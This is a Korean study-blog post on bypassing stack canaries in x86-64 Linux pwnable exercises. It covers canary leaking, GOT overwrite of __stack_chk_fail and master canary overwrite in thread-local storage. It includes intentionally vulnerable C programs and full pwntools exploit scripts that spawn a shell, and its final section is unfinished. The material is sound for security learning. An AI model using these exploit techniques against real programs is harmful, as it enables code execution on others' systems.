---
title: "[PWNABLE] Canary 우회"
description: "※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 이전 포스팅에서 canary에 대해 다루었다. 이번에는 그 우회 방법들을 다루겠다. 1. canary leak 2. got overwrite (간단하게만 설명하고, 자세한 내용은 plt/got에 대한 포스팅 이후 다루겠다.) 3. master can"
date: "2023-09-24"
translation_key: "tistory-136d7c463f6c"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-Canary-%EC%9A%B0%ED%9A%8C"
private: false
---

**※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다.** **※** 

이전 포스팅에서 canary에 대해 다루었다.

이번에는 그 우회 방법들을 다루겠다.

**1\. canary leak**

**2\. got overwrite (간단하게만 설명하고, 자세한 내용은 plt/got에 대한 포스팅 이후 다루겠다.)**

**3\. master canary 변조**

**4\. thread 영역 재설정**

* * *

### canary leak

가장 일반적인 방법으로, 리눅스의 stack 정렬하는 특징과 canary가 \\x00으로 끝난다는 특징을 이용한 방법이다.

![](/assets/images/tistory/tistory-136d7c463f6c/001.png)

실습 예제 코드

```
#include <stdio.h>

void getshell(){
    execve("/bin/sh",0,0);
}

int main(){
    int buf[0x30];

    printf("Hello! Whrd\n Input : ");
    read(0,buf,0x100);
    printf("Your Input : [%s]\n\n",buf);

    printf("Input : ");
    read(0,buf,0x100);

    return 0;
}
```

적용된 보호기법이다. 

PIE를 제외하고는 다 걸려있다. (편의상 제거해둔 상태입니다)

![](/assets/images/tistory/tistory-136d7c463f6c/002.png)

취약점은 bof할 때와 같이 read()함수에서 발생하고 있다.

![](/assets/images/tistory/tistory-136d7c463f6c/003.png)

read에서 호출된 buf의 위치는 rbp-0xd0이다.

앞서 배운 Return Address Overwrite 기법을 이용해서 똑같이 공격을 수행해보겠다.

```
from pwn import*

p = process('./cny')
e = ELF('./cny')
context.log_level='debug'

getshell = e.sym['getshell']

payload = b'a'*0xd0
payload += b'b'*0x8
payload += p64(getshell)

p.send(payload)

p.interactive()
```

![](/assets/images/tistory/tistory-136d7c463f6c/004.png)

canary가 깨지기 때문에 stack smashing이 뜨면서 종료된다.

![](/assets/images/tistory/tistory-136d7c463f6c/005.png)

리눅스는 64기준으로 8바이트씩 정렬하는 특징이 있다.

그렇다면 저 canary값의 1바이트만 침범하게 입력하면,

다음 printf에서 buf가 출력될 때 나머지 7바이트도 같이 나올 것이다라는 가설을 세울 수 있다.

마침 canary로 마지막 1바이트는 \\x00으로 고정된 값을 가지고 있다.

때문에 위의 가설로 canary를 알아내어 공격할 수 있다는 것을 생각할 수 있다.

바로 확인해보겠다.

![](/assets/images/tistory/tistory-136d7c463f6c/006.png)

stack상의 canary위치는 rbp-0x8이다.

buf의 위치는 rbp-0xd0이므로 dummy를 0xc8만큼 입력하고 추가로 1바이트만 더 입력해주면 된다.

![](/assets/images/tistory/tistory-136d7c463f6c/007.png)

현재 canary의 값이다.

![](/assets/images/tistory/tistory-136d7c463f6c/008.png)

canary 부분을 살펴보면 1바이트 \\x00이  \\x61로 변조되었다.

이 값을 \\x00으로 바꿔주면 canary를 얻어낼 수 있다.

![](/assets/images/tistory/tistory-136d7c463f6c/009.png)

얻어낸 값이 canary인 것을 확인할 수 있다.

이 값을 이용하여 아래와 같이 페이로드를 입력하면 된다.

dummy(0xc0) + canary(0x8) + sfp(0x8) + ret(0x8)

![](/assets/images/tistory/tistory-136d7c463f6c/010.png)

전체 페이로드이다.

```
from pwn import*

p = process('./cny')
e = ELF('./cny')
#context.log_level='debug'

getshell = e.sym['getshell']

payload = b'a'*0xc9

p.send(payload)

p.recvuntil(payload)
cny = u64(b'\x00' + p.recvn(7))
print(hex(cny))

pause()

payload = b'a'*0xc8
payload += p64(cny)
payload += b'b'*0x8
payload += p64(getshell)

p.send(payload)

p.interactive()
```

* * *

### got overwrite

해당 방법은 나중에 다룰 plt/got와 got overwrite에 대해 알고 있어야 한다.

때문에 지금은 어떤 방식인지만 보고 넘어가겠다.

![](/assets/images/tistory/tistory-136d7c463f6c/011.png)

함수를 보면 \_\_stack\_chk\_fail@plt라는 것이 있는 것을 볼 수 있다.

해당 주소는 함수의 실제 주소가 아니다. 

실제주소의 경우 plt => got => 실제 주소 순으로 위치하게 된다.

때문에 got가 가리키는 값인 실제 주소를 다른 값으로 변조하게 된다면 

해당 함수의 호출을 막아 비정상 종료를 우회할 수 있게된다.

![](/assets/images/tistory/tistory-136d7c463f6c/012.png)

* * *

### master canary 변조

thread 영역에 위치한 canary값을 변조하는 방법이다.

실습 예제를 만들고자 하였지만 잘 안되었기에 dreamhack.io에서 사용한 예제를 가지고 진행하겠다.

```
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void giveshell() { execve("/bin/sh", 0, 0); }
void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

void read_bytes(char *buf, int size) {
  int i;

  for (i = 0; i < size; i++)
    if (read(0, buf + i*8, 8) < 8)
      return;
}

void thread_routine() {
  char buf[256];
  int size = 0;
  printf("Size: ");
  scanf("%d", &size);
  printf("Data: ");
  read_bytes(buf, size);
}

int main() {
  pthread_t thread_t;

  init();

  if (pthread_create(&thread_t, NULL, (void *)thread_routine, NULL) < 0) {
    perror("thread create error:");
    exit(0);
  }
  pthread_join(thread_t, 0);
  return 0;
}
```

우선 코드를 살펴보면  thread\_routine()에서 bof 취약점이 발생한다.

원하는 크기를 입력하고 그 크기만큼 입력을 받는 기능이기 때문에 256보다 큰 값을 입력하면 된다.

해당 방법을 사용하기 위해서는 thread영역과 buf 사이의 거리를 알아내야 한다.

read\_bytes함수의 인자로 들어가는 것은 rbp-0x114와 rbp-0x110이 있다.

![](/assets/images/tistory/tistory-136d7c463f6c/013.png)

첫 번째 인자가 buf이기 때문에 rdi에 들어가는 rbp-0x110이 buf에 해당한다.

![](/assets/images/tistory/tistory-136d7c463f6c/014.png)

사이의 거리를 구하면 0x928이라는 값이 나온다.

이 값을 이용하여 그대로 입력하면 공격에 실패하게 된다.

이는 fs부분의 구조체를 살펴보아야 한다.

```
from pwn import*

p = process('./mc_thread')
e = ELF('./mc_thread')

give_shell = e.sym['giveshell']

payload = b'A' * 0x108 #buf
payload += b'B' * 0x8 #new cny
payload += b'A' * 0x8 #sfp
payload += p64(give_shell) #ret

payload += b'A' * (0x928 - len(payload)) #dummy
payload += b'B' * 0x8 #new Master cny

p.sendlineafter(b"Size: ", str(len(payload)))
p.sendafter(b"Data: ", payload)

p.interactive()
```

새로 설정할 canary를 BBBBBBBB로 설정하는 페이로드이다.

dumy를 포함한 보내는 데이터는 fs\_base + 0x28까지 변조시킨다.

문제는 모든 데이터를 A로 변조한다는 것이다.

![](/assets/images/tistory/tistory-136d7c463f6c/015.png)

```
//REG 상태
RAX  0x4141414141414141 ('AAAAAAAA')
RBX  0x7f5d06b88640 ◂— 0x4141414141414141 ('AAAAAAAA')
RCX  0x7f5d06ca09cc (read+76) ◂— cmp rax, -0x1000 /* 'H=' */
RDX  0x8
RDI  0x0
RSI  0x7f5d06b88650 ◂— 0x4141414141414141 ('AAAAAAAA')

//오류 부분
0x00007f5d06c1caf2 <+18>:  mov    BYTE PTR [rax+0x972],0x0
```

오류가 난 부분을 확인해보면 rax+0x972한 주소에 0을 넣어주는 부분이다.

현 상황에서 rax레지스터에는 0x4141414141414141이 들어가 있다.

그렇다면 rax값만 유효한 주소값 - 0x972 한값을 넣어주면 된다.

다음은 dreamhack.io에서 가져온 코드의 일부이다.

```
/* glibc-2.35/sysdeps/x86_64/nptl/tls.h */
/* Return the thread descriptor for the current thread. */
#  define THREAD_SELF \
  ({ struct pthread *__self;                  \
     asm ("mov %%fs:%c1,%0" : "=r" (__self)             \
    : "i" (offsetof (struct pthread, header.self)));          \
     __self;})
/* glibc-2.35/sysdeps/nptl/pthread.h */
enum
{
  PTHREAD_CANCEL_DEFERRED,
#define PTHREAD_CANCEL_DEFERRED PTHREAD_CANCEL_DEFERRED
  PTHREAD_CANCEL_ASYNCHRONOUS
#define PTHREAD_CANCEL_ASYNCHRONOUS PTHREAD_CANCEL_ASYNCHRONOUS
};
/* glibc-2.35/nptl/cancellation.c */
void
__pthread_disable_asynccancel (int oldtype)
{
  /* If asynchronous cancellation was enabled before we do not have
     anything to do.  */
  if (oldtype == PTHREAD_CANCEL_ASYNCHRONOUS)
    return;
  struct pthread *self = THREAD_SELF;
  self->canceltype = PTHREAD_CANCEL_DEFERRED;
}
```

전체를 보면 복잡하기 때문에 필요한 부분을 위주로 보겠다.

```
self->canceltype = PTHREAD_CANCEL_DEFERRE
```

구조체의 self -> canceltype에 접근하여 값을 설정해주고 있다.

이때 우리가 넣은 페이로드에 의해 0x4141414141414141로 덮어지게 된다.

```
struct pthread *self = THREAD_SELF;
```

self의 경우 THREAD\_SELF로부터 값을 가져온다.

THREAD\_SELF는 Thread Descriptor를 가져오는 매크로로, 

pthread 구조체에서 header.self의 offset 만큼 떨어진 값을 가져온다.

![](/assets/images/tistory/tistory-136d7c463f6c/016.png)

현 상황에서는 self를 포함한 모두 같은 값으로 덮어져 있다.

canary를 의미하는 stack\_gaurd보다 0x10만큼 높은 주소에 위치한다.

그럼 payload의 dumy를 0x918만 보내면 된다.

```
from pwn import*

p = process('./mc_thread')
e = ELF('./mc_thread')

give_shell = e.sym['giveshell']

payload = b'A' * 0x108 #buf
payload += b'B' * 0x8 #new cny
payload += b'A' * 0x8 #sfp
payload += p64(give_shell) #ret
payload += b'A'*(0x910-len(payload))
payload += p64(0x404f80-0x972) # valid address for fs:0x10 + 0x972
payload += b'B'*0x10 # DUMMY
payload += b'B' * 0x8 #new Master cny

p.sendlineafter("Size: ", str(len(payload)))
p.sendlineafter("Data: ", payload)

p.interactive()
```

최종 수정한 코드이다. 

![](/assets/images/tistory/tistory-136d7c463f6c/017.png)

* * *

### thread영역 재설정

(작성 중 - 예제 생성 및 실습 단계)
